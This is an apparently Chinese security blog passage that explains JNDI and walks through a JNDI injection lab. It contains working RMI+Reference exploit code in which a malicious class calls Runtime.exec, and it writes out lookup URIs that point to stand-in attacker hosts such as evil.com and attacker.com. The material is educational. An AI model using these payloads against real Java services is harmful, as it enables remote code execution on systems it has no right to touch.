<p><img src="../images/Fastjson%E6%8A%97%E4%BA%89%E7%9A%84%E4%B8%80%E7%94%9F/20200102094439-705c34bc-2d01-1.jpg" alt="img"></p>
<p><img src="../images/Fastjson%E6%8A%97%E4%BA%89%E7%9A%84%E4%B8%80%E7%94%9F/20200102094439-707ccdbc-2d01-1.jpg" alt="img"></p>
<p>对于之前提到了第三处mapping不需要校验，1.2.48也不行了：</p>
<p><img src="../images/Fastjson%E6%8A%97%E4%BA%89%E7%9A%84%E4%B8%80%E7%94%9F/20200102094439-70b6cd8c-2d01-1.jpg" alt="img"></p>
<p>因此，即使未开启AutoTypeSupport，但com.sun.rowset.JdbcRowSetImpl类并未缓存到Map中，就不能和前面一样调用TypeUtils.getClassFromMapping()来加载了，只能进入后面的代码逻辑进行黑白名单校验被过滤掉：</p>
<p><img src="../images/Fastjson%E6%8A%97%E4%BA%89%E7%9A%84%E4%B8%80%E7%94%9F/12.png" alt="img"></p>
<h1 id="1-2-48之后"><a href="#1-2-48之后" class="headerlink" title="1.2.48之后"></a>1.2.48之后</h1><p>在这个通杀payload之后，就又恢复了一片平静的，在服务端手动配置关闭白名单情况下的黑名单与绕过黑名单的战争。这个战争估计随着代码不断迭代，也是不会停止的。</p>
<p>参考：</p>
<p><a href="https://www.mi1k7ea.com/" target="_blank" rel="noopener">mi1k7ea</a></p>
<p><a href="https://xz.aliyun.com/t/7027#toc-18" target="_blank" rel="noopener">lalajun</a></p>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Fastjson</tag>
      </tags>
  </entry>
  <entry>
    <title>搞懂JNDI</title>
    <url>/%E6%90%9E%E6%87%82JNDI/</url>
    <content><![CDATA[<h1 id="序言"><a href="#序言" class="headerlink" title="序言"></a>序言</h1><blockquote>
<p>莫听穿林打叶声，何妨吟啸且徐行。</p>
</blockquote>
<p>前几天在搞RMI，发现攻击方式经常结合JNDI注入一起玩，这篇直接先来总结JNDI</p>
<a id="more"></a>

<h1 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h1><p>JNDI全称为 Java Naming and DirectoryInterface（Java命名和目录接口），是一组应用程序接口，为开发人员查找和访问各种资源提供了统一的通用接口，可以用来定义用户、网络、机器、对象和服务等各种资源。</p>
<p>JNDI支持的服务主要有：DNS、LDAP、CORBA、RMI等。</p>
<p>简单点说，JNDI就是一组API接口。<strong>每一个对象都有一组唯一的键值绑定，将名字和对象绑定</strong>，可以通过名字检索指定的对象，而该对象可能存储在RMI、LDAP、CORBA等等。</p>
<p>Java Naming and Directory Interface(JNDI)是一种Java API，可以通过名称来发现和查找数据和对象。这些对象可以存储在不同的命名或目录服务中，如远程方法调用(RMI)、公共对象请求代理体系结构(CORBA)、轻量级目录访问协议(LDAP)或域名服务(DNS)。</p>
<p>换句话说，JNDI就是一个简单的Java API（如“InitialContext.Lookup（String Name）”），它只接受一个字符串参数，如果该参数来自不可信的源的话，则可能因为远程类加载而引发远程代码执行攻击。</p>
<p>当被请求对象的名称处于攻击者掌控之下时，他们就能将受害Java应用程序指向恶意的RMI/LDAP/CORBA服务器，并使用任意对象进行响应。如果该对象是“javax.naming.Reference”类的实例，那么，JNDI客户端将尝试解析该对象的“classFactory”和“classFactoryLocation”属性。如果目标Java应用程序不知道“ClassFactory”的值，Java将使用Java的URLClassLoader从“ClassFactoryLocation”处获取该工厂的字节码。</p>
<p>由于其简单性，即使“InitialContext.lookup”方法没有直接暴露给受污染的数据，它对于利用Java漏洞来说也非常有用。在某些情况下，仍然可以通过反序列化或不安全的反射攻击来访问它。</p>
<p>如图：</p>
<p><img src="../images/%E6%90%9E%E6%87%82JNDI/1.png" alt="img"></p>
<h2 id="Java-Naming"><a href="#Java-Naming" class="headerlink" title="Java Naming"></a>Java Naming</h2><p>命名服务是一种键值对的绑定，使应用程序可以通过键检索值。</p>
<h2 id="Java-Directory"><a href="#Java-Directory" class="headerlink" title="Java Directory"></a>Java Directory</h2><p>目录服务是命名服务的自然扩展。这两者之间的区别在于目录服务中对象可以有属性，而命名服务中对象没有属性。因此，在目录服务中可以根据属性搜索对象。</p>
<p>JNDI允许你访问文件系统中的文件，定位远程RMI注册的对象，访问如LDAP这样的目录服务，定位网络上的EJB组件。</p>
<h2 id="ObjectFactory"><a href="#ObjectFactory" class="headerlink" title="ObjectFactory"></a>ObjectFactory</h2><p>Object Factory用于将Naming Service（如RMI/LDAP）中存储的数据转换为Java中可表达的数据，如Java中的对象或Java中的基本数据类型。每一个Service Provider可能配有多个Object Factory。</p>
<p>JNDI注入的问题就是处在可远程下载自定义的ObjectFactory类上。</p>
<h1 id="JNDI代码示例"><a href="#JNDI代码示例" class="headerlink" title="JNDI代码示例"></a>JNDI代码示例</h1><p>在JNDI中提供了绑定和查找的方法：</p>
<ul>
<li>bind：将名称绑定到对象中；</li>
<li>lookup：通过名字检索执行的对象；</li>
</ul>
<p>这两个操作都是用的InitialContext类对象来调用。多说无益，直接上代码：</p>
<p>下面是基本用法Demo，以RMI服务为例。</p>
<p>先定义一个Person类：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Person</span> <span class="keyword">implements</span> <span class="title">Remote</span>, <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = <span class="number">1L</span>;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> String password;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getPassword</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> password;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setPassword</span><span class="params">(String password)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.password = password;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"name:"</span>+name+<span class="string">" password:"</span>+password;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>接下来是Server端，Server.java，其实是将服务端和客户端的代码写在一起了，分为两个部分。第一部分是initPerson()函数即服务端，其通过JNDI实现RMI服务，并通过JNDI的bind()函数将实例化的Person对象绑定到RMI服务中；第二部分是findPerson()函数即客户端，其通过JNDI的lookup方法来检索Person对象并输出出来：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Server</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">initPerson</span><span class="params">()</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        <span class="comment">//配置JNDI工厂和JNDI的url和端口。如果没有配置这些信息，会出现NoInitialContextException异常</span></span><br><span class="line">        LocateRegistry.createRegistry(<span class="number">6666</span>);</span><br><span class="line">        System.setProperty(Context.INITIAL_CONTEXT_FACTORY, <span class="string">"com.sun.jndi.rmi.registry.RegistryContextFactory"</span>);</span><br><span class="line">        System.setProperty(Context.PROVIDER_URL, <span class="string">"rmi://localhost:6666"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//初始化</span></span><br><span class="line">        InitialContext ctx = <span class="keyword">new</span> InitialContext();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//实例化person对象</span></span><br><span class="line">        Person p = <span class="keyword">new</span> Person();</span><br><span class="line">        p.setName(<span class="string">"mi1k7ea"</span>);</span><br><span class="line">        p.setPassword(<span class="string">"Niubility!"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//person对象绑定到JNDI服务中，JNDI的名字叫做：person。</span></span><br><span class="line">        ctx.bind(<span class="string">"person"</span>, p);</span><br><span class="line">        ctx.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">findPerson</span><span class="params">()</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        <span class="comment">//因为前面已经将JNDI工厂和JNDI的url和端口已经添加到System对象中，这里就不用再绑定了</span></span><br><span class="line">        InitialContext ctx = <span class="keyword">new</span> InitialContext();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//通过lookup查找person对象</span></span><br><span class="line">        Person person = (Person) ctx.lookup(<span class="string">"person"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//打印出这个对象</span></span><br><span class="line">        System.out.println(person.toString());</span><br><span class="line">        ctx.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        initPerson();</span><br><span class="line">        findPerson();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>运行Server的程序，findPerson()函数会成功从启动的JNDI服务中找到指定的对象并输出出来：</p>
<p><img src="../images/%E6%90%9E%E6%87%82JNDI/image-20200629191702347.png" alt="image-20200629191702347"></p>
<h2 id="纯RMI与JNDI的对比"><a href="#纯RMI与JNDI的对比" class="headerlink" title="纯RMI与JNDI的对比"></a>纯RMI与JNDI的对比</h2><p>我们可以简单比较一下纯RMI写法和使用JNDI检索的写法，在纯RMI写法中的两种典型写法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"><span class="keyword">import</span> remote.IRemoteMath;</span><br><span class="line">...</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//服务端</span></span><br><span class="line">    IRemoteMath remoteMath = <span class="keyword">new</span> RemoteMath();</span><br><span class="line">    LocateRegistry.createRegistry(<span class="number">1099</span>);    </span><br><span class="line">    Registry registry = LocateRegistry.getRegistry();</span><br><span class="line">    registry.bind(<span class="string">"Compute"</span>, remoteMath);</span><br><span class="line">...</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//客户端</span></span><br><span class="line">    Registry registry = LocateRegistry.getRegistry(<span class="string">"localhost"</span>);        </span><br><span class="line">    IRemoteMath remoteMath = (IRemoteMath)registry.lookup(<span class="string">"Compute"</span>);</span><br><span class="line"></span><br><span class="line">或</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">	<span class="comment">//服务端</span></span><br><span class="line">    PersonService personService=<span class="keyword">new</span> PersonServiceImpl();</span><br><span class="line">    LocateRegistry.createRegistry(<span class="number">6600</span>);</span><br><span class="line">    Naming.rebind(<span class="string">"rmi://127.0.0.1:6600/PersonService"</span>, personService);</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">	<span class="comment">//客户端</span></span><br><span class="line">	PersonService personService=(PersonService) Naming.lookup(<span class="string">"rmi://127.0.0.1:6600/PersonService"</span>);</span><br></pre></td></tr></table></figure>

<p>而JNDI中相关代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line">...</span><br><span class="line">    </span><br><span class="line">	<span class="comment">//服务端</span></span><br><span class="line">	LocateRegistry.createRegistry(<span class="number">6666</span>);</span><br><span class="line">    System.setProperty(Context.INITIAL_CONTEXT_FACTORY, <span class="string">"com.sun.jndi.rmi.registry.RegistryContextFactory"</span>);</span><br><span class="line">    System.setProperty(Context.PROVIDER_URL, <span class="string">"rmi://localhost:6666"</span>);</span><br><span class="line">    InitialContext ctx = <span class="keyword">new</span> InitialContext();</span><br><span class="line">	...</span><br><span class="line">    ctx.bind(<span class="string">"person"</span>, p);</span><br><span class="line">    ctx.close();</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">	<span class="comment">//客户端</span></span><br><span class="line">    InitialContext ctx = <span class="keyword">new</span> InitialContext();</span><br><span class="line">    Person person = (Person) ctx.lookup(<span class="string">"person"</span>);</span><br><span class="line">	ctx.close();</span><br><span class="line"></span><br><span class="line">或</span><br><span class="line"></span><br><span class="line">	<span class="comment">//服务端</span></span><br><span class="line">    Properties env = <span class="keyword">new</span> Properties();</span><br><span class="line">    env.put(Context.INITIAL_CONTEXT_FACTORY,</span><br><span class="line">            <span class="string">"com.sun.jndi.rmi.registry.RegistryContextFactory"</span>);</span><br><span class="line">    env.put(Context.PROVIDER_URL,</span><br><span class="line">            <span class="string">"rmi://localhost:1099"</span>);</span><br><span class="line">    Context ctx = <span class="keyword">new</span> InitialContext(env);</span><br></pre></td></tr></table></figure>

<p>相比之下：</p>
<ul>
<li>服务端：纯RMI实现中是调用java.rmi包内的bind()或rebind()方法来直接绑定RMI注册表端口的，而JNDI创建的RMI服务中多的部分就是需要设置INITIAL_CONTEXT_FACTORY和PROVIDER_URL来指定InitialContext的初始化Factory和Provider的URL地址，换句话说就是初始化配置JNDI设置时需要预先指定其上下文环境如指定为RMI服务，最后再调用javax.naming.InitialContext.bind()来将指定对象绑定到RMI注册表中；</li>
<li>客户端：纯RMI实现中是调用java.rmi包内的lookup()方法来检索绑定在RMI注册表中的对象，而JNDI实现的RMI客户端查询是调用javax.naming.InitialContext.lookup()方法来检索的；</li>
</ul>
<p>简单地说，纯RMI实现的方式主要是调用java.rmi这个包来实现绑定和检索的，而JNDI实现的RMI服务则是调用javax.naming这个包即应用Java Naming来实现的。</p>
<h1 id="Reference类"><a href="#Reference类" class="headerlink" title="Reference类"></a>Reference类</h1><p>Reference类表示对存在于命名/目录系统以外的对象的引用。</p>
<p>Java为了将Object对象存储在Naming或Directory服务下，提供了Naming Reference功能，对象可以通过绑定Reference存储在Naming或Directory服务下，比如RMI、LDAP等。</p>
<p>在使用Reference时，我们可以直接将对象写在构造方法中，当被调用时，对象的方法就会被触发。</p>
<p>几个比较关键的属性：</p>
<ul>
<li>className：远程加载时所使用的类名；</li>
<li>classFactory：加载的class中需要实例化类的名称；</li>
<li>classFactoryLocation：远程加载类的地址，提供classes数据的地址可以是file/ftp/http等协议；</li>
</ul>
<p>例如这里定义一个 <code>Reference</code> 实例，并使用继承了 <code>UnicastRemoteObject</code> 类的 <code>ReferenceWrapper</code> 包裹一下实例对象，使其能够通过 <code>RMI</code> 进行远程访问：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Reference refObj = <span class="keyword">new</span> Reference(<span class="string">"refClassName"</span>, <span class="string">"insClassName"</span>, <span class="string">"http://example.com:12345/"</span>);</span><br><span class="line">ReferenceWrapper refObjWrapper = <span class="keyword">new</span> ReferenceWrapper(refObj);</span><br><span class="line">registry.bind(<span class="string">"refObj"</span>, refObjWrapper);</span><br></pre></td></tr></table></figure>

<p>当有客户端通过 <code>lookup(&quot;refObj&quot;)</code> 获取远程对象时，获得到一个 <code>Reference</code> 类的存根，由于获取的是一个 <code>Reference</code> 实例，客户端会首先去本地的 <code>CLASSPATH</code> 去寻找被标识为 <code>refClassName</code> 的类，如果本地未找到，则会去请求 <code>http://example.com:12345/refClassName.class</code> 动态加载 <code>classes</code> 并调用 <code>insClassName</code> 的构造函数。</p>
<h1 id="远程代码和安全管理器"><a href="#远程代码和安全管理器" class="headerlink" title="远程代码和安全管理器"></a>远程代码和安全管理器</h1><h2 id="Java中的安全管理器"><a href="#Java中的安全管理器" class="headerlink" title="Java中的安全管理器"></a>Java中的安全管理器</h2><p>Java中的对象分为本地对象和远程对象，本地对象是默认为可信任的，但是远程对象是不受信任的。比如，当我们的系统从远程服务器加载一个对象，为了安全起见，JVM就要限制该对象的能力，比如禁止该对象访问我们本地的文件系统等，这些在现有的JVM中是依赖安全管理器（SecurityManager）来实现的。</p>
<p><img src="../images/%E6%90%9E%E6%87%82JNDI/image-20200629203820570.png" alt="image-20200629203820570"></p>
<p>JVM中采用的最新模型见上图，引入了“域”的概念，在不同的域中执行不同的权限。JVM会把所有代码加载到不同的系统域和应用域，系统域专门负责与关键资源进行交互，而应用域则通过系统域的部分代理来对各种需要的资源进行访问，存在于不同域的class文件就具有了当前域的全部权限。</p>
<h2 id="JNDI的安全管理器"><a href="#JNDI的安全管理器" class="headerlink" title="JNDI的安全管理器"></a>JNDI的安全管理器</h2><p>对于加载远程对象，JDNI有两种不同的安全控制方式，对于Naming Manager来说，相对的安全管理器的规则比较宽泛，但是对JNDI SPI层会按照下面表格中的规则进行控制：</p>
<p><img src="../images/%E6%90%9E%E6%87%82JNDI/image-20200629203916955.png" alt="image-20200629203916955"></p>
<p>针对以上特性，黑客可能会找到一些特殊场景，利用两者的差异来执行恶意代码。</p>
<h2 id="JNDI协议动态转换"><a href="#JNDI协议动态转换" class="headerlink" title="JNDI协议动态转换"></a>JNDI协议动态转换</h2><p>举前面的例子，JNDI实现的RMI服务中，可以在初始化配置JNDI设置时预先指定其上下文环境（RMI、LDAP、CORBA等），这里列出前面的两种写法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">    Properties env = <span class="keyword">new</span> Properties();</span><br><span class="line">    env.put(Context.INITIAL_CONTEXT_FACTORY,</span><br><span class="line">            <span class="string">"com.sun.jndi.rmi.registry.RegistryContextFactory"</span>);</span><br><span class="line">    env.put(Context.PROVIDER_URL,</span><br><span class="line">            <span class="string">"rmi://localhost:1099"</span>);</span><br><span class="line">    Context ctx = <span class="keyword">new</span> InitialContext(env);</span><br><span class="line"></span><br><span class="line">或</span><br><span class="line"></span><br><span class="line">	LocateRegistry.createRegistry(<span class="number">6666</span>);</span><br><span class="line">    System.setProperty(Context.INITIAL_CONTEXT_FACTORY, <span class="string">"com.sun.jndi.rmi.registry.RegistryContextFactory"</span>);</span><br><span class="line">    System.setProperty(Context.PROVIDER_URL, <span class="string">"rmi://localhost:6666"</span>);</span><br><span class="line">    InitialContext ctx = <span class="keyword">new</span> InitialContext();</span><br></pre></td></tr></table></figure>

<p>但在调用lookup()或者search()时，可以使用带URI动态的转换上下文环境，例如上面已经设置了当前上下文会访问RMI服务，那么可以直接使用LDAP的URI格式去转换上下文环境访问LDAP服务上的绑定对象而非原本的RMI服务：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ctx.lookup(<span class="string">"ldap://attacker.com:12345/ou=foo,dc=foobar,dc=com"</span>);</span><br></pre></td></tr></table></figure>

<p>其原理可以跟踪代码找到：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">lookup</span><span class="params">(String name)</span> <span class="keyword">throws</span> NamingException </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> getURLOrDefaultInitCtx(name).lookup(name);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>再跟进去就知道了：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> Context <span class="title">getURLOrDefaultInitCtx</span><span class="params">(Name paramName)</span> <span class="keyword">throws</span> NamingException </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (NamingManager.hasInitialContextFactoryBuilder()) &#123;</span><br><span class="line">        <span class="keyword">return</span> getDefaultInitCtx(); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (paramName.size() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        String str1 = paramName.get(<span class="number">0</span>);</span><br><span class="line">        String str2 = getURLScheme(str1);  <span class="comment">// 尝试解析 URI 中的协议</span></span><br><span class="line">        <span class="keyword">if</span> (str2 != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="comment">// 如果存在 Schema 协议，则尝试获取其对应的上下文环境</span></span><br><span class="line">            Context localContext = NamingManager.getURLContext(str2, <span class="keyword">this</span>.myProps);</span><br><span class="line">            <span class="keyword">if</span> (localContext != <span class="keyword">null</span>) &#123; </span><br><span class="line">                <span class="keyword">return</span> localContext;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> getDefaultInitCtx();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="JNDI注入"><a href="#JNDI注入" class="headerlink" title="JNDI注入"></a>JNDI注入</h1><h1 id="前提防御-amp-JDK防御"><a href="#前提防御-amp-JDK防御" class="headerlink" title="前提防御&amp;JDK防御"></a>前提防御&amp;JDK防御</h1><p>要想成功利用JNDI注入漏洞，重要的前提就是当前Java环境的JDK版本，而JNDI注入中不同的攻击向量和利用方式所被限制的版本号都有点不一样。</p>
<p>这里将所有不同版本JDK的防御都列出来：</p>
<ul>
<li>JDK 6u45、7u21之后：java.rmi.server.useCodebaseOnly的默认值被设置为true。当该值为true时，将禁用自动加载远程类文件，仅从CLASSPATH和当前JVM的java.rmi.server.codebase指定路径加载类文件。使用这个属性来防止客户端VM从其他Codebase地址上动态加载类，增加了RMI ClassLoader的安全性。</li>
<li>JDK 6u141、7u131、8u121之后：增加了com.sun.jndi.rmi.object.trustURLCodebase选项，默认为false，禁止RMI和CORBA协议使用远程codebase的选项，因此RMI和CORBA在以上的JDK版本上已经无法触发该漏洞，但依然可以通过指定URI为LDAP协议来进行JNDI注入攻击。</li>
<li>JDK 6u211、7u201、8u191之后：增加了com.sun.jndi.ldap.object.trustURLCodebase选项，默认为false，禁止LDAP协议使用远程codebase的选项，把LDAP协议的攻击途径也给禁了。</li>
</ul>
<p>因此，我们在进行JNDI注入之前，必须知道当前环境JDK版本这一前提条件，只有JDK版本在可利用的范围内才满足我们进行JNDI注入的前提条件。</p>
<h2 id="RMI攻击向量"><a href="#RMI攻击向量" class="headerlink" title="RMI攻击向量"></a>RMI攻击向量</h2><h3 id="RMI-Reference利用技巧"><a href="#RMI-Reference利用技巧" class="headerlink" title="RMI+Reference利用技巧"></a>RMI+Reference利用技巧</h3><p>JNDI提供了一个Reference类来表示某个对象的引用，<strong>这个类中包含被引用对象的类信息和地址</strong>。</p>
<p>因为在JNDI中，对象传递要么是序列化方式存储（对象的拷贝，对应按值传递），要么是按照引用（对象的引用，对应按引用传递）来存储，当序列化不好用的时候，我们可以使用Reference将对象存储在JNDI系统中。</p>
<p>那么这个JNDI利用技巧是啥呢？——<strong>就是将恶意的Reference类绑定在RMI注册表中，其中恶意Reference引用指向远程恶意的class文件。当用户在/JNDI客户端的lookup()函数参数外部可控/或/Reference类构造方法的classFactoryLocation参数外部可控/时，会使用户的JNDI客户端访问RMI注册表中绑定的恶意Reference类，从而加载远程服务器上的恶意class文件在客户端本地执行，最终实现JNDI注入攻击导致远程代码执行</strong>。</p>
<p>我们看个示例，以lookup()函数参数外部可控为例，攻击原理如图：</p>
<p><img src="../images/%E6%90%9E%E6%87%82JNDI/6.png" alt="img"></p>
<ol>
<li>攻击者通过可控的 URI 参数触发动态环境转换，例如这里 URI 为 <code>rmi://evil.com:1099/refObj</code>；</li>
<li>原先配置好的上下文环境 <code>rmi://localhost:1099</code> 会因为动态环境转换而被指向 <code>rmi://evil.com:1099/</code>；</li>
<li>应用去 <code>rmi://evil.com:1099</code> 请求绑定对象 <code>refObj</code>，攻击者事先准备好的 RMI 服务会返回与名称 <code>refObj</code>想绑定的 ReferenceWrapper 对象（<code>Reference(&quot;EvilObject&quot;, &quot;EvilObject&quot;, &quot;http://evil-cb.com/&quot;)</code>）；</li>
<li>应用获取到 <code>ReferenceWrapper</code> 对象开始从本地 <code>CLASSPATH</code> 中搜索 <code>EvilObject</code> 类，如果不存在则会从 <code>http://evil-cb.com/</code> 上去尝试获取 <code>EvilObject.class</code>，即动态的去获取 <code>http://evil-cb.com/EvilObject.class</code>；</li>
<li>攻击者事先准备好的服务返回编译好的包含恶意代码的 <code>EvilObject.class</code>；</li>
<li>应用开始调用 <code>EvilObject</code> 类的构造函数，因攻击者事先定义在构造函数，被包含在里面的恶意代码被执行；</li>
</ol>
<p>代码如下，当然需要注意JDK版本的影响，我本地JDK版本为1.8.0_73。</p>
<p>JNDIClient.java，lookup()函数参数外部可控：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JNDIClient</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(args.length &lt; <span class="number">1</span>) &#123;</span><br><span class="line">            System.out.println(<span class="string">"Usage: java JNDIClient &lt;uri&gt;"</span>);</span><br><span class="line">            System.exit(-<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        String uri = args[<span class="number">0</span>];</span><br><span class="line">        Context ctx = <span class="keyword">new</span> InitialContext();</span><br><span class="line">        System.out.println(<span class="string">"Using lookup() to fetch object with "</span> + uri);</span><br><span class="line">        ctx.lookup(uri);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>EvilObject.java，恶意类，目的是弹计算器：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">EvilObject</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">EvilObject</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Process pc = Runtime.getRuntime().exec(<span class="string">"/Applications/Calculator.app/Contents/MacOS/Calculator"</span>);</span><br><span class="line">        pc.waitFor();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>RMIService.java，对象实例要能成功绑定在RMI服务上，必须直接或间接的实现 Remote 接口，这里 ReferenceWrapper就继承于 UnicastRemoteObject 类并实现了Remote接口：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RMIService</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Registry registry = LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        Reference refObj = <span class="keyword">new</span> Reference(<span class="string">"EvilObject"</span>, <span class="string">"EvilObject"</span>, <span class="string">"http://127.0.0.1:8080/"</span>);</span><br><span class="line">        ReferenceWrapper refObjWrapper = <span class="keyword">new</span> ReferenceWrapper(refObj);</span><br><span class="line">        System.out.println(<span class="string">"Binding 'refObjWrapper' to 'rmi://127.0.0.1:1099/refObj'"</span>);</span><br><span class="line">        registry.bind(<span class="string">"refObj"</span>, refObjWrapper);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里将RMIService.java和JNDIClient.java放在同一目录下，将EvilObject.java（恶意类开头千万不要有package的字段！！！）放在另一个目录下（为防止漏洞复现过程中应用端实例化EvilObject对象时从CLASSPATH当前路径找到编译好的字节代码，而不去远端进行下载的情况发生）,编译这三个文件，并在不同窗口下执行命令，最后成功通过RMI+Reference的方式实现JNDI注入：</p>
<p><img src="../images/%E6%90%9E%E6%87%82JNDI/image-20200630013330114.png" alt="image-20200630013330114"></p>
<p><img src="../images/%E6%90%9E%E6%87%82JNDI/image-20200630013405125.png" alt="image-20200630013405125"></p>
<p>这里我再总结一下攻击的整体逻辑：</p>
<ol>
<li>JNDIClient：他就是个客户端，但是外部参数可控lookup（）位置；</li>
<li>EvilObject.class：恶意类，内部的构造函数弹出计算器；</li>
<li>RMIService：做了很多事<ol>
<li>注册1099端口，registry对象；</li>
<li>Reference类对象refObj：声明EvilObject恶意类，并写出他的位置，例如本地8080端口；</li>
<li>将上一步的refObj打包成ReferenceWrapper对象，叫做xxxWrapper；</li>
<li>最后一步直接绑定，将registry.bind(‘refObj’,xxxWrapper);</li>
</ol>
</li>
</ol>
<h3 id="漏洞点1-lookup-参数注入"><a href="#漏洞点1-lookup-参数注入" class="headerlink" title="漏洞点1-lookup()参数注入"></a>漏洞点1-lookup()参数注入</h3><p>当JNDI客户端的lookup()函数的参数可控即URI可控时，根据JNDI协议动态转换的原理，攻击者可以传入恶意URI地址指向攻击者的RMI注册表服务，以使受害者客户端加载绑定在攻击者RMI注册表服务上的恶意类，从而实现远程代码执行。</p>
<p>下面以RMI服务为例，原理和上一个小结讲的是一样的，本地JDK版本为1.8.0_73。</p>
<p>AClient.java，是JNDI客户端，原本上下文环境已经设置了默认连接本地的1099端口的RMI注册表服务，同时程序允许用户输入URI地址来动态转换JNDI的访问地址，即此处lookup()函数的参数可控：</p>
